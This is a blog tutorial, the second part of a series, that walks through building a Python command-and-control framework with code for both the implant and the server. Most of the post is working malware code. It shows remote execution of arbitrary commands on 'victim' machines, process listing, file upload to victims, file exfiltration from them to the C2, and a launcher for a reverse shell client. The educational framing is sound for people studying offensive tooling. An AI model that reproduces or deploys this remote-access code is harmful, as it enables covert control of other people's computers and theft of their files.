---
title:  "Create your own C2 using Python- Part 2"
header:
  teaser: "/assets/images/c2_part2.png"
categories:
  - C2
  - Python
tags:
  - C2
  - Python
  - sockets
  - '2024'
  - metasploit
  - custom
  - DIY
  - command and control
---

Hey everyone!  Welcome to Part 2 of the **Create your own C2 series**.  You have likely learned by now this is not going to be some crazy beefed out C2.  My main aim for this series is to help the avid cyber enthusiast better understand how sockets work, learn the basic components of a C2 using Python, and do it all without much coding involved.  Yes, we will get into process migration, privilege escalation, etc.  I promise!  But I wanted to first start with the basics and help you, the reader, understand how some of the standard C2 functions can be implemented using a simple and accessible programming language such as Python 🐍.  

When I was getting started learning Python, it appealed to me greatly due to its ease of use and cross platform OS compatibility.  I'm a huge fan of Linux, specifically `Debian` and `Arch/Manjaro` Linux.  Being able to code both my C2 server console and Windows agents in Python and port them to Linux and Windows, respectively, is an amazing thing!  I realize Python is not the only coding language that lends itself to cross platform functionality, but for whatever reason it's what stuck for me.  If you've never explored Python, I hope this is a fun introduction to the language. Well, you know I have to ramble for a few minutes before the actual code gets presented to you.  It's my annoying trademark move 😸  Let's get started on Part 2 okay?

***Part 2 - Out with the old, in with the New!***
-

Let's pick up where we last left off.  We implemented these features below and had to literally type the numbers to access a command, which is no bueno:

```python
 while True:
        if os.name == 'nt':
            os.system("cls")
        else:
            os.system("clear")
        print(Fore.GREEN)
        print("what would you like to do?")
        print("1. Send a Message")
        print("2. Get user info")
        print("3. Get public ip")
        print("4. Kill Zombie")
        print("5. Start a Shell!")
        print("6. Whoami")
```

Today, we're going to simplify things even more while also adding in four new features to our C2.

- The ability to list `running processes` on the victim machine
- The ability to `upload` and `download` files to and from our implant/agent!
- Lastly, the ability to run commands, any commands, on the agent using the `execute` command!
  
Aesthetically, it looks like crap having a menu always in your face using a C2.  If we want a menu, we'll ask for one right?! Yeah, I agree 😄  The first shell, which I called << elev8 >> (yeah cheesy, i get it) is just your basic prompt and remains unchanged from Part 1.  Type 'help' or '?' to access the commands.  It's very basic:

![image](https://github.com/user-attachments/assets/1ec6a5ec-5202-469b-901d-d081942997d9)

> Okay, once your implent/zombie is online, you'll select it like we did in Part1.  Type `zombies` in the first shell prompt to access your zombies. 🧟  The first zombie is always '0' btw, then '1', '2', and so on.  However, this time, you will be greeted with a basic shell instead of the command options:

![image](https://github.com/user-attachments/assets/fcb6fdba-4643-42d3-81ca-7122df90240e)

> If we type '?' or 'help', we can then see the menu with various options for our C2.  You can also type 'cls' or 'clear' to clear the screen:

![image](https://github.com/user-attachments/assets/8d442ffc-6c1c-46b8-96cf-9cec072c8e2d)

> We'll start with the `execute` command.  Basically, execute anything you want on the implant/zombie agent:

![image](https://github.com/user-attachments/assets/8fbf89b5-ab25-4252-a16f-f38d1e75cb7d)

![image](https://github.com/user-attachments/assets/8df2df89-8c41-49ba-a20e-5ff54cedf6ca)

You get the idea 😸

> Let's check out the new `procs` command.  This will produce the `Process Name`, `ID`, and `User` fields for all running processes:

![image](https://github.com/user-attachments/assets/0b0f91f9-f4d4-491d-b231-716fac0209c3)

> Next up, we have the send command.  Just type `send` and you'll be greeted with an input prompt asking for the location of the local file you wish to upload to the implant/zombie.  I have a basic pdf file I'm using for this particular example. I've also included a progress bar 😄:

![image](https://github.com/user-attachments/assets/16f26a92-f0b0-4cd6-83a4-93485a67ae74)

Once the file completes the upload, it will be in the `c:\users\public\uploads` directory on the Windows machine running the implant.

![image](https://github.com/user-attachments/assets/8e105f56-1ebc-494e-830f-928dcec685ed)

> Okay, now for the `receive` command.  Just type `recv` to bring up the receive prompt and this will `download` a file from the machine running the implant/zombie.  Let's say I want to download this file from the victim:

![image](https://github.com/user-attachments/assets/bf900c6c-d631-4872-a8c8-34cde685cf07)

No Problemo, just do the following:

![image](https://github.com/user-attachments/assets/46802f6f-4de4-4ae5-a029-27eaa6a9c32c)

And there it is!

![image](https://github.com/user-attachments/assets/0852147e-094c-4580-ae1e-e4167624da35)

***Adding in the code changes - Implant/Agent code updates***
-

> Updates applied to code from PART 1

I updated the reverse shell companion python script to use python instead of a pyinstaller compiled script.exe

```python
#def startrevshellsvr():
#    subprocess.call(["python", "pyrevshell_server.py"])
#    exit_event.set()
def startrevshellcli():
    subprocess.call("py C:/Users/public/pyrevshell_client.py") # <--
    exit_event.set()
```

I also included a threaded receive file function for when we send files to the zombie agent:

```python
def recfile(filepath,filesize):
    filesize=int(filesize)
    with open(filepath, 'wb') as f:
        received = 0
        while received < filesize:
            data = client.recv(4096)
            if not data:
                break
            if not "?keepalive?" in data.decode("UTF-8", errors="ignore"):
                f.write(data)
                received += len(data)
    print(f"Saved: {filepath}")
    exit_event.set()
```

> Code for implant receiving an uploaded file from C2:

```python
if ":upload:" in data:
    client.send(b"***Ready for upload to begin***!!\n")
    print(data.split(":"))
    data=data.split(":")
    filename=data[2]
    filesize=data[3]
    filepath = UPLOAD_DIR + "/" + filename
    print(filepath)
            
    exit_event.clear()
    handler_thread3 = threading.Thread(target=recfile, args=(filepath,filesize))
    handler_thread3.daemon = True
    handler_thread3.start()
    while not exit_event.is_set():
        time.sleep(1)
    client.send(b"File successfully uploaded!\n")
```

> And the code for when the C2 wishes to download a file from the implant!

```python
if "~download~" in data:
    print(data.split("~"))
    data=data.split("~")
    filepath = data[2]
    print(filepath)
    time.sleep(3)
            
    if not os.path.isfile(filepath):
        print(f"Error: File '{filepath}' does not exist.")
        return
    filename = os.path.basename(filepath)
    print(filename)
    filesize = os.path.getsize(filepath)
    filesize=str(filesize)
    print(filesize)
    client.send(filesize.encode())
    with open(filepath, 'rb') as f:
        for chunk in iter(lambda: f.read(4096), b''):
            client.sendall(chunk)
                  
    #client.send(b"file sent!\n")
    time.sleep(3)
```

> Lastly, the code for when we want to execute a command on the victim box:

```python
if "c0mm@nd" in data:
    command=data.split("\n")
    command=command[1]
    print("command: ", command)
    proc = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    #print(proc.stdout.read().decode())
    output=proc.stdout.read().decode().strip()
    #print(output)
    output=output.encode()
    proc.stdin.close()
    proc.terminate()
            
    client.sendall(b"returned output: \n"+output+b"\n:endofoutput:\n")
```

***Adding in the C2 Server code Updates***
-

> Menu updates

Here, we remove the code that would clear the screen automatically each time we loaded the menu and also give the user the choice to open the menu:

```python
 while True:
        """
        --> you can uncomment if you want, but I like the commands showing on screen
        if os.name == 'nt':
            os.system("cls")
        else:
            os.system("clear")
        """
        try:
            choice=input(Fore.YELLOW + "[C2-Shell]:~$ " + Fore.WHITE)
        except:    
            print(Fore.RED + "[!] enter a number..." + Fore.WHITE)
            time.sleep(2)
            return
        if choice == "cls" or choice == "clear":
            if os.name == 'nt':
                os.system("cls")
            else:
                os.system("clear")
        if choice == "help" or choice == "?":
            print(Fore.GREEN)
            print("Commands\n==================")
            print("msg: Send a Message")
            print("userinfo: Get user info")
            print("execute: Enter a command to be executed!")
            print("kill: Kill Zombie")
            print("procs: list all processes & their respective users (run as admin for best results)")
            print("shell: Start a Shell!")
            print("whoami: Whoami")
            print("send: Send a file")
            print("recv: Receive a file")
            print("return: Main menu")
            print(Fore.WHITE)
            input()
```

> The code to download a file:

```python
if choice == "recv":
            print("Enter the filepath + filename you want to download, ex: c:\\temp\\file.txt")
            file_path=input(":").strip()
            if not "." in file_path:
                print("did you intentionally include a file without a file extension? I'm going to assume not and back out")
                print("If this was intended, well...edit this code :D")
                return
            filename = file_path.rsplit("\\", 1)[-1] 
            print(filename)
            clientlist[selection][1].send(f"~download~{file_path}~\n".encode())
            filesize=clientlist[selection][1].recv(1024)
            filesize=int(filesize.decode())
            user = os.environ.get("USER")
            download_location = f"/home/{user}/Downloads/{filename}"
            with open(download_location, 'wb') as f:
                received = 0
                while received < filesize:
                    data = clientlist[selection][1].recv(4096)
                    if not data:
                        break
                    if not "?keepalive?" in data.decode("UTF-8", errors="ignore"):
                        f.write(data)
                        received += len(data)
            print("[+] File successfully downloaded!\n")
```

> The code to upload a file:

```python
if choice == "send":
            file_path = input("Enter the path of the file to upload: ").strip()
            if not os.path.isfile(file_path):
                print(f"Error: File '{file_path}' does not exist.")
                return
            filename = os.path.basename(file_path)
            print(filename)
            filesize = os.path.getsize(file_path)
            print(filesize)
            clientlist[selection][1].send(f":upload:{filename}:{filesize}:\n".encode())
            #print(Fore.GREEN + "[+] command sent!" + Fore.WHITE)
            cresponse=clientlist[selection][1].recv(1024)
            print(cresponse.decode('UTF-8'))
            time.sleep(3)
            
            with open(file_path, 'rb') as f, tqdm(total=filesize, unit="B", unit_scale=True, desc=f"Uploading {filename}") as pbar:
                for chunk in iter(lambda: f.read(4096), b''):
                    clientlist[selection][1].sendall(chunk)
                    pbar.update(len(chunk))
            
            cresponse2=clientlist[selection][1].recv(1024)
            print(cresponse2.decode('UTF-8'))
            time.sleep(3)
```

> The code to list all running processes:

```python
if choice == "procs":
            print("Give this about 10-15 seconds to execute.  Lots of data to load...\n")
            try:
                thecommand="for /f \"tokens=1,2,7,8,9\" %A in ('tasklist /NH /V') do @echo %A %B %C %D %E"
                clientlist[selection][1].send(f"c0mm@nd\ncmd.exe /c {thecommand}\n".encode('utf-8'))
                print(Fore.GREEN + "[+] command sent!" + Fore.WHITE)
                #clientlist[selection][1].settimeout(4)
                while True:
                    data2=clientlist[selection][1].recv(1024)
                  
                    if not data2 or ":endofoutput:" in data2.decode():
                        endoutput=data2.decode()
                        endoutput = endoutput.replace(":endofoutput:", "")
                        print(endoutput, end='')
                        break
                    #proclist = proclist.decode('UTF-8')
                    #print(proclist)
                    print(data2.decode(), end='')
                input("[+] DONE! Press any key to return...")
            except:
                print(Fore.RED + "[+] Either reached end of output for receiving socket or..." + Fore.WHITE)
                print(Fore.RED + "[!] there was an error sending the command to the zombie...\ncheck to see if your zombie died" + Fore.WHITE)
                time.sleep(2)
```

> And finally, the code to execute commands on the victim/zombie agent:

```python
if choice == "execute":
            try:
                print("Enter your command you would like to execute on the agent below")
                thecommand=input(":")
                clientlist[selection][1].send(f"c0mm@nd\ncmd.exe /c {thecommand}\n".encode('utf-8'))
                print(Fore.GREEN + "[+] command sent!" + Fore.WHITE)
                #clientlist[selection][1].settimeout(4)
                while True:
                    data2=clientlist[selection][1].recv(1024)
                  
                    if not data2 or ":endofoutput:" in data2.decode():
                        endoutput=data2.decode()
                        endoutput = endoutput.replace(":endofoutput:", "")
                        print(endoutput, end='')
                        break
                    #proclist = proclist.decode('UTF-8')
                    #print(proclist)
                    print(data2.decode(), end='')
                input("[+] DONE! Press any key to return...")
            except:
                print(Fore.RED + "[+] Either reached end of output for receiving socket or..." + Fore.WHITE)
                print(Fore.RED + "[!] there was an error sending the command to the zombie...\ncheck to see if your zombie died" + Fore.WHITE)
                time.sleep(2)
```
Source code located in the usual spot:

[https://github.com/g3tsyst3m/CodefromBlog](https://github.com/g3tsyst3m/CodefromBlog)

Also, here's the GIF I used in my X post that demo's some of these new features!  

![c2_part2](https://github.com/user-attachments/assets/debf1b8d-be1f-446f-a62a-e46f2269e565)

Thanks everyone, and be sure to stay tuned for `Part 3` where we explore `getsystem` and `process migration` techniques and incorporate them into our code!

















